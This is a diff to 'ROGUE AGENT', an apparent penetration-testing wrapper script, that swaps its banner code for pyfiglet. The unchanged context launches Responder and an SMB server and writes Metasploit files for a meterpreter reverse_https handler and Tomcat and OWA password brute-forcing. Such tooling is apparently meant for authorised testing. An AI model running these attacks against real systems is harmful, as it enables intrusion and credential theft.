@@ -25,6 +25,7 @@ import hashlib
 import os.path
 import sqlite3
 import binascii
+import pyfiglet
 import datetime
 import requests
 import linecache
@@ -315,13 +316,11 @@ def fileCheck(variable):
    return
    
 def banner(variable):
-   blank = ""
-   for x in range(1, 6):
-      cursor.execute("SELECT BANNER FROM " + variable + " WHERE IDS = " + str(x))
-      data = cursor.fetchone()
-      blank = blank + data[0] + "\n"
-   with open("banner.tmp","w") as banner:
-      banner.write(blank)
+   command("clear")
+   ascii_banner = pyfiglet.figlet_format(variable)
+   ascii_banner = ascii_banner.rstrip("\n")
+   print(colored(ascii_banner,colour0, attrs=['bold']))
+   command("pyfiglet " + variable + " > banner.tmp")
    return
 
 def display():
@@ -656,19 +655,10 @@ else:
 # Modified: N/A                                                               
 # -------------------------------------------------------------------------------------
 
-Yellow = '\e[1;93m'
-Green  = '\e[0;32m'
-Reset  = '\e[0m'
-Red    = '\e[1;91m'
-
-command("echo '" + Red + "'")
 command("xdotool key Alt+Shift+S; xdotool type 'ROGUE AGENT'; xdotool key Return")
-banner("BANNER1")
-command("clear; cat banner.tmp")
-command("echo '" + Yellow + "'")
-print("\t\t\t\t\t\t               T R E A D S T O N E  E D I T I O N                \n")
-command("echo '" + Reset + "'")
-print(colored("[*] ROGUE AGENT (TREADSTONE EDITION) booting, please wait...", colour3))
+banner("ROGUE  AGENT")
+print(colored("\t\tT R E A D S T O N E  E D I T I O N",colour7,attrs=['bold']))
+print(colored("\n\n[*] Booting, please wait...", colour3))
 print("[+] Using localhost IP address " + localIP + "...")
 
 # -------------------------------------------------------------------------------------
@@ -1374,9 +1364,8 @@ while True:
       if HTTP != 1:
          command("xdotool key Ctrl+Shift+T")
          command("xdotool key Alt+Shift+S; xdotool type 'HTTP SERVER'; xdotool key Return")
-#         banner("BANNER2")
-#         command("xdotool type 'clear; cat banner.tmp'; xdotool key Return")
-         command("xdotool type 'cat " + dataDir + "/banner2.txt'; xdotool key Return") # TEMP
+         banner("HTTP SERVER") 
+         command("xdotool type 'clear; cat banner.tmp'; xdotool key Return")
          command("xdotool type 'python3 -m http.server --bind " + localIP + " " + HTTP + "'; xdotool key Return")
          command("xdotool key Ctrl+Tab")
 
@@ -1391,7 +1380,7 @@ while True:
    if selection == '14':
       command("xdotool key Ctrl+Shift+T")
       command("xdotool key Alt+Shift+S; xdotool type 'SMB SERVER'; xdotool key Return")
-      banner("BANNER3")
+      banner("SMB SERVER") 
       command("xdotool type 'clear; cat banner.tmp'; xdotool key Return")
       command("xdotool type 'impacket-smbserver " + httpDir + " ./" + httpDir + " -smb2support'; xdotool key Return")
       command("xdotool key Ctrl+Tab")
@@ -1407,10 +1396,9 @@ while True:
    if selection == '15':
       command("xdotool key Ctrl+Shift+T")
       command("xdotool key Alt+Shift+S; xdotool type 'RESPONDER'; xdotool key Return")
-#      banner("BANNERX")
-#      command("xdotool type 'clear; cat banner.tmp'; xdotool key Return")
+      banner("RESPONDER") 
+      command("xdotool type 'clear; cat banner.tmp'; xdotool key Return")
       command("xdotool type 'responder -I " + netWork + " -v'; xdotool key Return")
-      time.sleep(10)
       command("xdotool key Ctrl+Tab")
 
 # ------------------------------------------------------------------------------------- 
@@ -3541,9 +3529,9 @@ while True:
             
          command("xdotool key Ctrl+Shift+T")
          command("xdotool key Alt+Shift+S; xdotool type 'METERPRETER TOMCAT'; xdotool key Return")
+         banner("METERPRETER") 
+         command("xdotool type 'clear; cat banner.tmp'; xdotool key Return")
          command("xdotool type 'msfconsole -r meterpreter.rc'; xdotool key Return")
-         banner("BANNER4")
-         time.sleep(10)
          command("xdotool key Ctrl+Tab")
       
 # ------------------------------------------------------------------------------------- 
@@ -3566,15 +3554,13 @@ while True:
             write.write("set USER_FILE " + dataDir + "/usernames.txt\n")
             write.write("set PASS_FILE " + dataDir + "/passwords.txt\n")
             write.write("set lhost " + localIP + "\n")
-            write.write("clear\n")
-            write.write("cat banner.tmp\n")
             write.write("run\n")   
             
          command("xdotool key Ctrl+Shift+T")
          command("xdotool key Alt+Shift+S; xdotool type 'METERPRETER OWA'; xdotool key Return")
+         banner("METERPRETER") 
+         command("xdotool type 'cat banner.tmp'; xdotool key Return")
          command("xdotool type 'msfconsole -r meterpreter.rc'; xdotool key Return")
-         banner("BANNER4")
-         time.sleep(10)
          command("xdotool key Ctrl+Tab")
 
 # ------------------------------------------------------------------------------------- 
@@ -3586,24 +3572,23 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection =='88':
-      checkParams = getPort()      
+      checkParams = getPort()
       
-      if checkParams != 1:        
+      if checkParams != 1:       
+
          with open("meterpreter.rc", "w") as write:
             write.write("use exploit/multi/handler\n")
             write.write("set PAYLOAD /windows/x64/meterpreter/reverse_https\n")
             write.write("set LHOST " + localIP + "\n")
             write.write("set LPORT " + checkParams + "\n")
-            write.write("clear\n")
-            write.write("cat banner.tmp\n")
             write.write("run\n")            
-            
+
          command("xdotool key Ctrl+Shift+T")
          command("xdotool key Alt+Shift+S; xdotool type 'METERPRETER SHELL'; xdotool key Return")
+         banner("METERPRETER")
+         command("xdotool type 'cat banner.tmp'; xdotool key Return")
          command("xdotool type 'msfconsole -r meterpreter.rc'; xdotool key Return")
-         banner("BANNER4")
-         time.sleep(10)
-         command("xdotool key Ctrl+Tab")         
+         command("xdotool key Ctrl+Tab")
       
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
